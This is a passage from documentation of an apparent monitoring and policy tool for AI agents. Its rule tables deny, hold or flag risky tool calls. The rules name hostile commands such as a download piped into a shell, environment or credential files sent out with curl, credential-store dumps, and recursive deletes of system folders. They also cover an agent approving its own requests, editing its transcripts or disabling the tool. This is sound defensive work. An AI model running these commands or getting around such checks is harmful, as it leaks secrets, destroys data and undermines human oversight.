(`TK-A062` doesn't); `Artifact`, `ArtifactData` and `SendUserFile` stay unmapped and flagged (their writes publish to claude.ai or send files off the machine to the user's Claude app), and `TK-A081` holds a `RemoteTrigger` call other than its `list`, `get`, `list_runs` or `get_run_log` reads (a routine runs in the cloud, where none of its calls are decided here). `TK-F020` and `TK-F021` flag every email and payment tool's call, `TK-F022` every database query and `TK-F023` every Browser Use action, as `TK-F006` flags an MCP call that writes or sends. Plus `TK-A056`, which holds a push to main or master, a push whose branch the line can't tell (no refspec, `HEAD`, an expansion), a tag push, `--all` or `--mirror` (`git push`, `git send-pack`, `hub push`), and a publish or deploy (`npm`/`pnpm`/`yarn`/`bun publish`, `uv`/`poetry`/`cargo`/`hatch`/`flit publish`, `gem push`, `twine upload` and any runner's `-m twine upload`, `-m hatch publish` or `-m flit publish`, `docker`/`podman push`, `helm install`/`upgrade`/`push`, `terraform`/`tofu`/`terragrunt apply`, `pulumi up`, `kubectl apply`/`delete` (not a dry run), a `gh` or `hub api` call on main's ref, any merge through `repos/<o>/<r>/merges`, a contents-API write to the default branch, a fork's `merge-upstream` or `gh repo sync <owner/repo>` into it, each read percent-decoded, a GraphQL `updateRef`, `updateRefs`, `mergeBranch` or `createCommitOnBranch`, `sl push --to main` (`refs/heads/main` and `remote/main` too) or without `--to`, `git town ship` or `git-town ship`, `jj git push` with no arguments, `--all`, `--tracked`, a main bookmark (`-bmain`, `exact:main`), a `glob:` or a revision (`-r @`: a branch the line can't tell)), reading each git push's refspecs from its argv (field `push`); a push of a named branch other than main and master stays flagged (`TK-F004`), a force push is `TK-D003`'s deny and a delete push `TK-A002`'s ask; it is here, not in the coding pack, because a server agent's deploy is often its job. Plus `TK-F048`, which holds a Git or cargo config file or a virtualenv's activate script a file tool writes (`.git/config`, `~/.gitconfig`, `.gitconfig.local`, `.cargo/config.toml`, `.venv/bin/activate`), which can change where a push goes or what a command publishes, and `TK-F049`, which holds a Git config section in git's syntax a file tool writes into a file a Git config may include (flagged in the coding pack). Plus `TK-A032`, which holds uploads to cloud storage (`gsutil` and `gcloud storage` cp, mv or rsync to `gs://`, `aws s3` cp, mv or sync to `s3://`, `az storage blob upload`): a coding agent on a laptop rarely writes to a bucket, and the server pack, which extends `coding.yaml`, leaves uploads alone; and `TK-DEMO-DENY` (denies the tool `tracekit_demo_denied`) and `TK-DEMO-ASK` (holds `tracekit_demo_ask` for a person), so both are easy to see |
| `browser.yaml` | browser agents (Browser Use; Playwright's and Puppeteer's MCP navigation tools, `browser_navigate`, `browser_tab_new` and `puppeteer_navigate`, by their bare names) | local file, `javascript:` and internal-network navigation (addresses and names) denied; uploads, typing outside an allowlist, the agent's own page JavaScript (`evaluate`), and typing or a navigation with a query string to a host from untrusted content, ask; Browser Use's actions are `structured_output` |
| `server.yaml` | server-hosted agents | `extends: [coding, browser, server-data, server-net, server-cloud, server-comms, server-core]`; `unknown_tools: ask`: an unmapped tool waits for a person; detection in shadow: `TK-Q001` a secret read then egress (notify), `TK-L001` a runaway loop and `TK-L002` a delete burst (limits), `executed_against_policy` (notify); `TK-F003`, `TK-F005`, `TK-F012` and `TK-F013` keep their wider forms here (every destructive command word on a line, every secrets-file name, every URL, every network command), and `TK-F028` flags an email send with a recipient as egress, as the detection counts them, while `TK-F006` and `TK-F011` are the coding pack's |
| `strict.yaml` | server-hosted agents no call should surprise | `extends: server.yaml`, no new patterns: `TK-F004` (push, publish, install, `docker run`, apply), `TK-F011` and `TK-F025` (environment changes), `TK-F013` (network commands), `TK-F024` (an upload tool's file) and `TK-F030` (a release, an image push, a subtree push, a push setting, a publishing CLI's command the line can't tell; a draft release too) `TK-F048` (a Git or cargo config file or a virtualenv's activate script a file tool writes) and `TK-F049` (a Git config section written into a file a Git config may include) ask instead of flag, `TK-F003`, `TK-F005`, `TK-F006` and `TK-F012` keep their wider flags (every destructive command word on a line, every secrets-file name, every MCP call, every URL), and `on_parse_error: deny` |
| `server-data.yaml` | SQL tools | destructive and privilege-changing SQL, SQL that reaches the server's shell or files |
| `server-net.yaml` | HTTP tools | internal addresses; a body sent outside the egress allowlist |
| `server-cloud.yaml` | cloud CLIs and cloud MCP tools | IAM and access changes denied; resource deletion asks |
| `server-comms.yaml` | payments, email, chat | moving money, mass email and whole-channel notifications ask |
| `server-core.yaml` | every tool (composed by `server.yaml` and `dev.yaml`) | `extends: coding.yaml`; a secret in a call, a credentials file, the cloud metadata service, a command run through another command's options (deny); a command or code through an MCP tool and an A2A message (ask); maps the Anthropic `bash` tool to `shell` |

### What the laptop default holds

Every call is decided, signed and recorded. The laptop default (`dev.yaml`) asks a person, or denies, for these, and
records and runs the rest:

| On the short list | Held (ask) or denied | Recorded and run |
|---|---|---|
| Spending money | money moved by a payment tool (`TK-M001`, `TK-M002`, `TK-M005`), a Stripe, PayPal or Square charge, payout, transfer or refund from the shell (`TK-A043`, curl's as it reads them: `TK-A095`) or an MCP tool (`TK-A044`, `TK-A045`), and curl's config file written (`TK-A093`, `TK-A094`), which a GET reads first | every payment tool's call, flagged (`TK-F021`) |
| Sending messages, emails or posts outside | mass email (`TK-M003`), a whole-channel notice (`TK-M004`), a recipient, payee or host that came only from untrusted content (`TK-P001`, `TK-P002`, `TK-P003`), a secret in any call (`TK-S002`, denied) | one email, an MCP tool's chat message or a message to another agent, flagged (`TK-F020`, `TK-F006`, `TK-F018`); a post through the `gh` CLI (`gh issue create`, `gh pr comment`), allowed |
| Deleting data outside the project or on remotes | infrastructure, a database or a volume (`TK-A001`, `TK-A048`, `TK-A055`), cloud resources and audit logging (`TK-C010`, `TK-C011`), bucket data (`TK-A031`), a remote Git ref (`TK-A002`), a repository or project (`TK-A042`), a repository's secrets or protections (`TK-A047`, and a GitLab project's: `TK-A087`), a CI workflow (`TK-A049`), a drop, truncate or unfiltered delete through a database client or tool (`TK-A039`, `TK-A041`; `TK-DB001` to `TK-DB003` denied), `rm -r` of root or a home (`TK-D004`, denied) | a local `rm`, `mv` or `chmod`, flagged (`TK-F003`) |
| Deploying, pushing or merging to shared places | a push to main or master, of tags or of every branch, or to a branch the line can't tell, and a publish or deploy (`TK-A056`: also a release created or published through GitHub's API, an image pushed by a build, bake or compose, a `git subtree push`, a push setting written, a publishing CLI's command whose subcommand the line can't tell, a Cloud Run service updated or replaced, traffic moved to a Cloud Run or App Engine version, a monorepo's release however its tool is run: `lerna publish`, `changeset publish`, `nx release`), a pull request's merge (`TK-A033`), an upload to cloud storage (`TK-A032`), model weights published to a hub (`TK-A060`); a force push is denied (`TK-D003`) | a push of a named branch other than main and master, flagged (`TK-F004`) |
| Touching secrets or credentials, or sending them out | a credentials file read or touched (`TK-S004`, `TK-S007`), a secret's value in a call (`TK-S002`, `TK-S003`), the cloud metadata service (`TK-S001`), a credentials file or the environment written or sent (`TK-D005`, `TK-D010`, `TK-D023`, `TK-D006`, `TK-D015`, `TK-D011`, `TK-D022`), an operating system's whole credential store (`TK-D020`), all denied; a credential or secret store read (`TK-A020`, `TK-A021`, `TK-A035` to `TK-A038`, `TK-A052`, `TK-A053`); a cloud identity or access change (`TK-C001`, `TK-C002`, denied); a CI workflow write sending secret data as HTTP(S) request data (`TK-A061`) | a secret-looking path, flagged (`TK-F005`) |
| Running downloaded code | a download piped into a shell (`TK-D002`, denied) or into an interpreter given code (`TK-A046`), a package installed from a URL (`TK-D021`, denied) or a version-control source (`TK-A028`), or through a chosen index (`TK-A025`) | a package install from the default index, flagged (`TK-F004`) |
| Changing the guardrails | Tracekit's files, signer or policy (`TK-D007`, `TK-D013`), the harness's transcripts (`TK-D008`, `TK-D009`), an approval answered or a grant issued by the agent (`TK-D012`), all denied; removing or stopping Tracekit (`TK-A054`), the agent's own `tracekit init` or MCP gateway (`TK-A057`), a harness's settings changed by its own command or a harness started with settings the agent chose (`TK-A069`, `TK-A070`), the harness's settings, hooks or plugins (`TK-F009`, `TK-F015`, `TK-A088`, `TK-A089`, `TK-A090`, `TK-A091`, `TK-A092`), the plugin hook's Python in PowerShell's or cmd's form on Windows (`TK-A096`), a Git hook (`TK-A012`, `TK-A013`, `TK-A083`), a command outside the sandbox (`TK-A003`, `TK-A004`, `TK-A014`) | `ANTHROPIC_BASE_URL` named, flagged (`TK-F016`, `TK-F017`) |
| Code or calls Tracekit can't inspect | an IPython cell in gptme (`TK-A063`), keys sent to an existing gptme tmux pane (`TK-A064`), a gptme MCP server load (`TK-A065`), a shell line the parser can't read (`TK-SHELL-PARSE`), an unmapped tool given a command line or SQL (`TK-A062`), a remote subagent (`TK-F019`); a call whose arguments are over 64 KiB as JSON waits for a person on the laptop default (`TK-OVERSIZE`, `oversize: ask`) | an unmapped tool given data, flagged (`TK-UNKNOWN-TOOL`) |

The server pack's other rules hold or deny here too: privilege escalation (`TK-D001`) and a command run through another
command's options (`TK-S006`), denied; internal addresses (`TK-N001` to `TK-N003`, `TK-B001` to `TK-B003`), denied;
something that runs at every login or boot (`TK-A010`, `TK-A011`, `TK-A082`), history or system logs cleared (`TK-A026`,
`TK-A027`, `TK-A029`), a package manager's sources changed (`TK-A024`, `TK-A030`), Docker's host access (`TK-A022`,
`TK-A023`), a patch applied through the shell (`TK-A034`), model weights written or deleted (`TK-A058`, `TK-A059`), a command or
code through an MCP tool (`TK-S010`, `TK-S012`), an A2A message (`TK-S011`), and a browser's uploads, typing and page
JavaScript (`TK-B010` to `TK-B012`), held. Network commands and web requests, background processes, shell shadowing and
environment changes are flagged (`TK-F001`, `TK-F002`, `TK-F007`, `TK-F008`, `TK-F010` to `TK-F014`), and so are every
database query and Browser Use action, and an MCP call that writes or sends (`TK-F022`, `TK-F023`, `TK-F006`). Reading, writing and running things
in the project, tests and builds among them, is allowed. `strict.yaml` holds more: pushes, installs and `docker run`
(`TK-F004`), environment changes (`TK-F011`, `TK-F025`), network commands (`TK-F013`) and uploads (`TK-F024`).

`coding.yaml` rules (see the file for patterns and rationales):

| Section | Rules |
|---|---|
| deny | `TK-D001` privilege escalation (`sudo`, `sudoedit`, `doas`, `pkexec`, systemd's `run0`, and `su` in any form) · `TK-D002` running downloaded code: a `curl`/`wget` pipe into a bare shell or interpreter (including `python -`), process substitution, an executed command substitution, download-then-chmod-and-run, or `exec`/`eval` of `urlopen`; a pipe into an interpreter with `-c`/`-e` or a script path is held by `TK-A046`, and a download to a file or `/dev/null` is allowed unless another command runs it; a download no command on the line can run is read as data: a status check (`-o /dev/null`, `-I`, `--spider`; what `-w` prints) and a save of only data files (`.json`, `.csv`, `.html`, an image, a font …) on a line that doesn't move, link, unpack or load them, sets no loader variable (`BASH_ENV`, `PYTHONPATH`, `NODE_PATH` …), runs no shell or interpreter interactively and runs none of them, where a project's own script given one as data (`python3 parse.py f.json`) or inline code that only reads one (`json.load(open(…))`) runs none · `TK-D003` force push (`git push`, `git send-pack` or `hub push`): `--force` (also `--force-with-lease`), `-f` in a short-option cluster before any `o` (`-uf`, `-4f`), a `+` refspec or `--mirror` (or any prefix of it), read in the push's own words as `TK-A002` reads them, so a later command (`git push && ls -f`) or a commit message naming a force push isn't one; also a GitHub ref updated through its API (`gh api`, `curl`, …) or GraphQL's `updateRef` with a `force` of any value but a literal `false` or `0` (a PATCH without one only fast-forwards, as a plain push does; a body the policy can't read, from a file or a variable, is held) · `TK-D004` recursive delete of root or home (`rm -r`, also of its every file or dotfile, `~/*` or `~/.*`, or `find … -delete` on root, or on a home with no filter but depth and type or `-true`/`-print`, or one that matches every file: `-name '*'`, `-path '*'`, `-regex '.*'` or `-size +0`; either as one of up to nine starting points, after find's own options such as `-x`, `-L`, `-D tree` or `-O3`, and with extra slashes or `.` such as `//` or `~/.`; a Windows drive's root or a home on it, `C:\`, `C:/Users/<name>`, `/c/`, `%USERPROFILE%` or `$USERPROFILE`, is root or home too) · `TK-D014` recursive delete, permission change, lock or move of a system folder: `rm -r` of `/etc`, `/usr`, `/var`, `/bin`, `/sbin`, `/lib`, `/lib64`, `/boot`, `/opt`, `/srv`, macOS's `/System`, `/Library`, `/Applications` and `/private/etc` or `/private/var`, or `C:\Windows`, in any case (also of its every file, `/etc/*`, and with extra slashes, `.`, one `<folder>/..` step or one child and `..` after it, such as `//etc`, `/etc/.`, `/./etc`, `/usr/../etc` or `/etc/ssh/..`), also with the words a here-string gives `xargs` (`xargs rm -rf <<< /etc`), `find … -delete` and `find … -exec` (or `-ok`) of `rm`, `chmod`, `chown`, `chgrp` or `chattr +i`/`+a` on one read as `TK-D004` reads a home (in parentheses too; so `find /var -name '*.log' -delete` isn't denied), `git clean` in or of one, `chmod -R`, `chown -R` or `chgrp -R` of one or of `/`, `chattr -R +i` or `+a` of one or of `/`, `mv` of one as a source, and `rsync` with a delete option into one from a source; a folder inside one (`/var/tmp/x`, `/usr/local`) isn't one, and `sudo`, `env` and `sh -c` are read through · `TK-D010` writing a credentials file (`.env`, an SSH key, `authorized_keys`, `~/.aws/credentials` or `config`) from the shell: `cp`, `mv` or `install` with it last, `tee` with it among its files, or a redirection into it, each command on its own (a wrapper's, `find -exec`'s or a nested shell's too); a read redirected from one (`< .env`) is denied too, since a redirection's target doesn't say which way it goes · `TK-D023` the same files written by any of the shell's writers (the `effects` field: a redirection, `tee`, `cp`, `mv`, `install`, `dd of=`, `truncate`, sed's, perl's and ruby's in-place switches, `awk`'s `print >` and gawk's `-i inplace`, `sort -o`, `uniq`, `ed`, `ex`, `vim -es` and the other writers of a named file, `find -exec` and `find … \| xargs` on what the find finds, a command after `cd` in its folder too, and each name a pattern there may stand for), an `.env` template exempt as in `TK-D005` · `TK-D011` sending credential files off the machine (SSH keys, AWS credentials, `.netrc`, a process's environment read from `/proc/<pid>/environ` into an upload; a kubeconfig, Docker's `config.json`, gcloud's credentials or `.git-credentials` read into an upload, sent by `scp` or `rsync` to a `host:` or as a `curl`/`wget` upload or body, so fetching a kubeconfig into place isn't one) · `TK-D006` uploading a secrets file or the environment (`.env` in any case: piped from `cat`, `base64`, `xxd` or `gzip` into an upload or a new gist, sent as a file or a body, `$(cat .env)` too, or `gh gist create .env`; `env`, `printenv` or `export -p` where a command starts, piped into an upload directly or through up to two stages that pass the text on, such as `base64`, `gzip` or `grep`, or `$(env)` in a network command) · `TK-D022` an upload tool sending a secrets file (CodeBuddy Code's `LibraryUpload` of a file `TK-D006` or `TK-D011` denies sending from the shell: `.env`, `.ssh`, a private key, AWS credentials, `.netrc`, a cluster, Docker, gcloud or Git credential file; a public key may go) · `TK-D015` the whole environment (`env` or `printenv` alone, `export`, `set`, `declare -p` with no name, a process's `environ` file) printed into a program that sends it off the machine (`curl`, `wget`, `nc`, `ssh`, `scp`, `rsync`, a gist): a later stage of its pipeline (not through `wc` or a checksum) or a sender anywhere in one (a block, loop or subshell, behind a wrapper, in code `bash -c` or `eval` runs, in a substitution), its words or herestring (`$(env)`, `<(env)`), or a block or subshell piped to it · `TK-D008` modifying the harness's transcripts: a file a command writes or deletes (`effects`, as `TK-F015` reads them) in `.claude/projects`, `.codex/sessions`, `.gemini/tmp` or OpenCode's sessions (`opencode*.db` and `storage/` in `~/.local/share/opencode` or `$XDG_DATA_HOME/opencode`), or a delete of a home folder holding them (`~/.claude`, `~/.codex`, `~/.gemini`, `~/.local`, `~/.local/share`, OpenCode's data folder, `$XDG_DATA_HOME`; a home is `~`, `$HOME`, `/home/<u>`, `/Users/<u>`, `C:\Users\<u>`, `/root` or `/var/root`); in a call with a writer that gets its files at run time or runs code (`xargs rm`, `rm "$f"`, `docker exec c sh -c '…'`), any word naming those folders, and a link made in them (`ln`, `cp -s`, `cp -l`); a database `sqlite3` runs a writing statement on (`DELETE`, `DROP`, `INSERT`, `UPDATE`, … outside literals, as an argument or in a heredoc or herestring); a listing, a read or text that names them isn't one unless such a writer is in the same call (on any of its lines); Claude Code's memory notes (a `.md` file directly in `.claude/projects/<project>/memory/`, as `TK-D009` reads them) aren't held · `TK-D005` writing a credentials file · `TK-D009` writing the harness's transcripts with a file tool (OpenCode's sessions in `~/.local/share/opencode` too; one under a custom `XDG_DATA_HOME` isn't matched) or OpenCode's config (`~/.config/opencode`); Claude Code's memory notes beside the transcripts (a `.md` file directly in `.claude/projects/<project>/memory/`) stay writable · `TK-D007` touching Tracekit's own files or signer (reads shell targets: paths and installed packs still match on reads, and process stop/kill and signer state commands match; data such as echo/printf text, grep/rg patterns, `sed -n` scripts, and commit messages is omitted unless the same call later consumes written text; help and version commands are read-only) · `TK-D013` writing Tracekit's files, signer state or policy · `TK-D012` answering an approval from the agent's session: `tracekit approve` or `reject`, and `tracekit approvals approve` or `reject` (also after `--signer`), run directly, through a wrapper or runner (`env`, `uvx`, `uv tool run`, `pipx run`, `uv run`, `hatch run`, `conda run`, …), `sh -c`, `eval`, a path to the binary, a copy or link of it the same call makes, or `python -m tracekit` (also `py`, `pythonw` or `pypy`, and a runner's `-m`: `uv run -m tracekit.cli`); listing and showing approvals aren't denied, and neither is code that calls the signer's `approval_decide` itself (`python -c`, a script) · `TK-D020` dumping a whole OS credential store (`security dump-keychain` and `security export` but with `-t certs` or `pubKeys`, also after security's global options, `secret-tool search --all`, `pass grep`, `gopass grep`, `keepassxc-cli export`) · `TK-D021` installing a package directly from a URL (its scheme in any case, also as a PEP 508 direct reference, `name @ https://…`; a version-control source, npm's `github:` shorthand among them, is held by `TK-A028`) |
| ask | `TK-A001` destroying a deployment, database or volume, or removing infrastructure state: `terraform`/`tofu`/`terragrunt destroy` and `apply -destroy` (terragrunt also after `run`, `run-all` or `stack run`, and its older `destroy-all`), `terraform`/`tofu`/`terragrunt state rm`, `pulumi destroy`/`down`/`dn`, `pulumi stack rm` and `dropdb`, also under `railway run` or `heroku run`; `cdk destroy` and `railway delete`/`remove`/`rm`/`down` (also through `npx`, `bunx`, `pnpm dlx`, `yarn dlx` or `npm exec`), `fly destroy`/`delete`/`remove`/`rm`, `heroku apps:` or `addons:destroy`/`delete`/`remove` and `pg:reset`, and a `curl`/`wget`/`http`/`xh`/`railway api` call carrying a `volumeDelete(`/`serviceDelete(`/`environmentDelete(`/`projectDelete(`/`databaseDelete(` mutation. For `terraform`, `tofu`, `terragrunt`, `fly` and `cdk`, up to four option groups may precede the subcommand; npx-style launchers permit up to four before the launched program (`cdk --app infra/app.js destroy prod`, `npx --yes cdk destroy`). `--help` as the last word after at most two subcommand words (`terraform destroy --help`) is exempt. It doesn't see a request body read from a file or pipe (`-d @mutation.json`), an interpreter one-liner (`node -e`, `python -c`), a command run inside a container or remote shell (`docker run … terraform destroy`, `fly ssh console -C`, `heroku run bash -c …`), SQL such as `psql -c 'DROP DATABASE'`, a saved destroy plan (`terraform plan -destroy -out=p`, then `terraform apply p`), or more options before the subcommand · `TK-A048` deleting Docker or Podman volumes (`podman-remote` too): `volume rm`, `volume remove` and `volume prune` (up to eight options, with their values, between `volume` and the verb too, where podman also takes its global options), `system prune` with `--volumes` (up to eight options before `prune` too), and `compose down` (also `docker-compose` and `podman-compose`) with `-v` or `--volumes`, or a prefix of it such as `--vol`, which docker-compose 1.x and podman-compose accept (also `=true` and the other spellings of true, `=1`, `=t`, `=T`, `=TRUE`, `=True`; `=false` and the other spellings of false aren't held), read in each command's own words, with up to six options before the subcommand (Docker's remote TLS form takes five; eight before `down`, for `-f` and `-p`) and sixteen words between `prune` or `down` and the flag; `volume ls` and `inspect`, `system df`, `system prune` without `--volumes`, `compose down` without `-v` and `image prune` aren't held, and neither is text that names the command (`echo docker volume rm x`); a command that asks for help (`--help` or `-h` as the last word after at most two words, `docker volume rm -h`; podman's `volume prune help`) isn't held, but one with a volume's name before the help flag is (`docker volume rm pgdata --help`) · `TK-A055` a framework's command that drops or resets a database: Prisma's `migrate reset` and `db push --force-reset`, Sequelize's `db:drop` and Supabase's `db reset` (bare, or through `npx`, `bunx`, `pnpm`, `yarn` or `npm exec` with up to four options before the program, an `@version` too), Rails' `db:drop`, `db:reset`, `db:purge`, `db:truncate_all`, `db:migrate:reset` and `db:seed:replant` (also `db:drop:all` and the like; `rails` or `rake`, also after `bundle exec`), Django's `flush` (`manage.py`, `python -m django` or `django-admin`), Laravel's `migrate:fresh`, `migrate:reset`, `migrate:refresh` and `db:wipe` (`artisan`, also after `php` or `sail`), TypeORM's `schema:drop`, Ecto's `ecto.drop` and `ecto.reset` and EF Core's `database drop`, each read in the command's own words; migrating, seeding, diffing (`prisma migrate dev`, `rails db:seed`, `supabase db diff`), `manage.py sqlflush` (it only prints SQL) and text that names a command aren't held, and neither is a command that asks for help (`--help` or `-h` as the last word after at most two short words) · `TK-A058` a file tool's write to a model weights file (`.safetensors`, `.gguf`, `.pt`, `.pth`, `.ckpt`, and `.onnx`, `.h5`, `.keras`, `.tflite`, `.mlmodel` or `.msgpack` in a `model` or `models` folder) by Write, Edit, MultiEdit or NotebookEdit (a harness's Delete arrives as an Edit); reads and writes to other extensions are not held · `TK-A059` a shell command's write or delete of a model weights file of those formats, as `TK-D008` reads them (`WRITE_TARGET:` and `DELETE_TARGET:` from redirections, `cp`, `mv`, `tee`, `dd`, `sed -i`, a download's output, `rm`, `git rm`, …); reads and writes to other extensions are not held · `TK-A067` a file tool's write of a `.pth` file directly into a `site-packages` or `dist-packages` folder, held as a Python .pth file, which runs at every Python start, not as a model weights file · `TK-A068` the same from the shell, as `TK-D008` reads write targets · `TK-A060` publishing model weights to a hub or registry: `huggingface-cli` and `hf` `upload` and `upload-large-folder`, `ollama push`, after up to eight options; downloads (`huggingface-cli download`, `ollama pull`) are not held · `TK-A071` a raw request through the Docker or Podman socket: `curl`, `wget`, `socat`, `nc`, `ncat` or `netcat` with any words and one that names `docker.sock`, `docker.raw.sock`, `podman.sock` or a Podman machine API socket (`podman-machine-default-api.sock`, `…/podman-machine-<name>-api.sock`, `…/podman/<name>-api.sock`) (`--unix-socket`, `UNIX-CONNECT:`, `-U`, an `http+unix://` URL); `docker ps` and `ls -la /var/run/docker.sock` are not held · `TK-A072` `DOCKER_HOST=unix://…`, or Podman's `CONTAINER_HOST=unix://…`, set where a command starts (also after `{`, `then`, `do`, `else`, `env`, `nohup` or `nice` (each also by its path) and their options and numbers, `command`, `time`, `!` and other assignments) for a program other than `docker`, `podman`, `docker-compose`, `podman-compose` or `podman-remote` (by a path too, or `.exe`); `DOCKER_HOST=unix://… docker ps`, `CONTAINER_HOST=unix://… podman ps` and `export DOCKER_HOST=…` are not held · `TK-A073` a write (redirection, `tee` …) into a file named `release_agent` or `notify_on_release` (a cgroup's, under `/sys/fs/cgroup/` or wherever it is mounted); reading either is not held · `TK-A074` the file tools (`Write`, `Edit`, `MultiEdit`, `NotebookEdit`) writing a file named `release_agent` or `notify_on_release` · `TK-A002` deleting a remote Git branch or tag with `git push` (or `git send-pack`, `hub push`) `--delete` or `-d` (also abbreviated, `--del`, or in a short-option cluster, `-4d`), a deletion refspec (`:branch`, or an all-zero source object id) or `--prune`, also after an argument with a newline in it; a dry run is held too (`--mirror`, or any prefix of it, is `TK-D003`'s); and a remote branch or tag deleted through a platform's API, read as `TK-A042` reads a repository's deletion: a `DELETE` of GitHub's `/repos/<owner>/<repo>/git/refs/<ref>` (a ref of up to nine `/`-separated parts) or GitLab's `/api/v4/projects/<id>/repository/branches/<name>`, `tags/<name>` or `merged_branches` (a bare path through `gh`, `hub` or `glab api` too), or a GraphQL `deleteRef` mutation. It doesn't see a deletion set through config (`-c remote.origin.push=:b`, `-c remote.origin.mirror=true`) or a Git alias (`-c alias.p=push`; the server pack's `TK-S006` denies every `-c alias.*`), more than eight global options before `push` (a bound against backtracking), a quoted value with a space (`-C 'my dir'`), a refspec from a variable, brace expansion or `xargs`, a shell alias or function or `git send-pack` · `TK-A033` merging a pull request: `gh pr merge` (also `--auto` and `--admin`) and `glab mr merge` or `accept`, with up to four options before each word; a request to GitHub's or GitLab's merge endpoint (`…/pulls/N/merge`, `…/merge_requests/N/merge`, `N` possibly a variable) or one carrying GitHub's GraphQL `mergePullRequest`, `enablePullRequestAutoMerge` or `enqueuePullRequest`, or GitLab's `mergeRequestAccept`, through `gh`, `glab` or `hub api`, `curl`, `wget`, HTTPie or `xh`, also after an argument with a newline in it (a multi-line query); a status check on the endpoint is held too; a local `git merge` isn't held, and a merge asking for `--help` is (`gh pr merge 42 --body --help` merges) · `TK-A042` deleting a repository, project, organization or group through a platform's API: a `DELETE` request to GitHub's `/repos/<owner>/<repo>` or `/orgs/<org>`, GitLab's `/api/v4/projects/<id>` or `/api/v4/groups/<id>` or Vercel's `/v9/projects/<name>` (the path ends at the repository, project, organization or group, so deleting one issue comment, a member or another sub-resource isn't held) through `gh`, `glab` or `hub api`, `curl`, `wget`, HTTPie or `xh`, with the method before or after the URL and up to sixteen words (empty ones too) before and between them, the method in any case, after `-X` ending a cluster of short options (`-iX`, `-sSX`) or set at run time (`-X "$M"`, `-X $(echo DELETE)`), the URL's scheme in any case or left out, its host a variable, the owner and repository also as one variable (`repos/$GITHUB_REPOSITORY`) and GitLab's `$CI_API_V4_URL`; `gh repo delete`, `glab repo delete`, `glab project delete`, `hub delete` and `vercel remove`, `rm` or `project(s) remove`/`rm`, with up to four options before each word (an empty or space-edged value too); a bare `repos/<owner>/<repo>` or `orgs/<org>` path as a `gh` or `hub api` argument, or a bare `projects/<id>` or `groups/<id>` path as a `glab api` argument, read the same way (a path that runs past the repository or project, such as a branch or file under it, isn't held); or a GraphQL `deleteRepository` mutation, also after an argument with a newline in it (a multi-line query); a `GET` of the same URLs isn't held · `TK-A047` taking a repository's protections apart through GitHub: `gh secret delete` and `gh variable delete` (or `remove`), with `--repo`/`-R`, `--env` or `--org` and up to four options before each word (an empty value too); `gh repo edit` turning secret scanning, its push protection or advanced security off (`--enable-secret-scanning=false`, or a value set at run time such as `=$OFF`); a `DELETE`, `PUT` or `PATCH` through `gh` or `hub api` or `curl`, or a `curl` upload (`-T`, `--upload-file`: a `PUT`), on a branch's `protection` or a path under it, a repository's or organization's `rulesets`, their Actions, Dependabot or Codespaces `secrets` and `variables`, an `environments/<name>` or a path under it, or the user's Codespaces secrets; a `DELETE` of a repository's `vulnerability-alerts` or `automated-security-fixes` (a `PUT` turns them on); each as a bare path or a URL (its scheme in any case or left out, the API's URL as a variable, also under `/api/v3`), the owner and repository also as one variable (`repos/$GITHUB_REPOSITORY/…`), with the method in any case before or after it, also after `-X` at the end of a cluster of short options (`-iX`, `-sSX`) or set at run time (`-X "$M"`, `-X $(echo DELETE)`), and up to sixteen words, empty ones too, around the method; a `PATCH` that sets a `security_and_analysis` feature's `status` to `disabled`; and a `gh` or `hub api` `DELETE` whose path is built at run time (an argument with `$` or a backquote, such as a base64-decoded path); a `GET` of the same paths, `gh secret list`, `gh secret set` and turning a feature on aren't held · `TK-A087` taking a GitLab project's protections apart through `glab` or its API: `glab variable delete` (or `remove`, `rm`), with up to four options before each word; a `DELETE` through `glab api` or `curl` on a project's `protected_branches/<name>`, `protected_tags/<name>`, `variables/<key>` or `push_rule`, or a group's `variables/<key>`, as a bare path, after `/api/v4/` or after a host (its scheme in any case or left out), the project or group id numeric or URL-encoded (`group%2Fproj`), with the method in any case before or after it and up to sixteen words, empty ones too, around the method; a `GET` of the same paths, `glab variable list`, `get` and `set` aren't held · `TK-A043` moving money through Stripe, PayPal or Square from the shell: the Stripe CLI's `refunds`, `payouts`, `transfers`, `topups` and `transfer_reversals create`, `charges create` or `capture`, `payment_intents create`, `confirm` or `capture`, `invoices pay` and `treasury outbound_payments`/`outbound_transfers create` (up to eight options before the resource and again before its operation); `stripe post` to one of those endpoints (also a charge's refund or capture, a transfer's reversals and the v2 `money_management` outbound payments and transfers); and a POST to one of them on `api.stripe.com`, to a PayPal payout, order capture, authorization capture or capture refund on `api.paypal.com` or `api-m.paypal.com`, or to a Square payment, refund or payment completion on `connect.squareup.com`, through `curl`, `wget`, HTTPie or `xh` (any number of slashes after the host). A POST is each client's own: curl's `-X`/`--request POST` or a body option (`-d`, `-F`, `--data*`, `--form*`, `--json`); wget's `--method POST`, `--post-data` or `--post-file`; HTTPie's and xh's `POST` method word, `--raw`, or a data item after the URL (`k=v`, `k:=v`, `k@file`; not a `k==v` query). Before the URL it reaches the URL across any words that can't start another POST of that client (a body of any length, an empty argument, extra spaces); after the URL, within sixteen space-separated pieces. A call with no amount (a full refund, a confirm, capture or invoice pay) is held as any other, and so is a Stripe sandbox call (the key, not `--live`, can make a call live); PayPal's and Square's sandbox hosts aren't held. Not held: listing, retrieving, updating or cancelling, `stripe listen`, `trigger`, `logs tail` and `login`, `stripe get`, `stripe <resource> <operation> --help` (or `-h`) with nothing else, and a GET, Stripe's documented `curl -G … -d limit=3` list form too (unless a `-X`/`--request` word sets the method) · `TK-A095` the same POSTs through curl as curl's grammar reads them (the shell field `requests`): whatever option spells the body (`--expand-data`, `--expand-json`, `--expand-form`) or the method (`--expand-request`), wherever the URL sits among any number of words, as curl requests it (its globs expanded, dot segments removed, the host's case, a user and a port dropped), and a request whose method or URL the line can't tell, or a curl the grammar can't read, on one of those URLs · `TK-A044` an MCP tool that moves money by its name: Stripe's `send_money`, `transfer_money` and `convert_currency` (Treasury) and its agent toolkit's `create_refund`, from any server (Crush's joined `mcp__<server>_<tool>` too), in snake or camel case (`createRefund`) · `TK-A045` Stripe's `stripe_api_write` MCP tool when its arguments name a refund anywhere, or one of `TK-A043`'s Stripe endpoints as a path; `stripe_api_read` and other writes (a customer, a product) aren't held · `TK-A049` deleting CI workflows or pipeline files (`rm`, `git rm` and other shell deletions recognized by `effects`), including `.github` or `.circleci` folders; writing CI content that uploads secret data is checked by `TK-A061`; only emptying without a matching upload command is not checked for secret exfiltration · `TK-A061` holding direct `Write` or `Edit` of recognized CI workflow files that upload variable or secret data using `curl`/`wget` over HTTP(S) · `TK-A034` applying a patch through the shell: Codex's `apply_patch` or `applypatch` (in any `/` directory, also started as 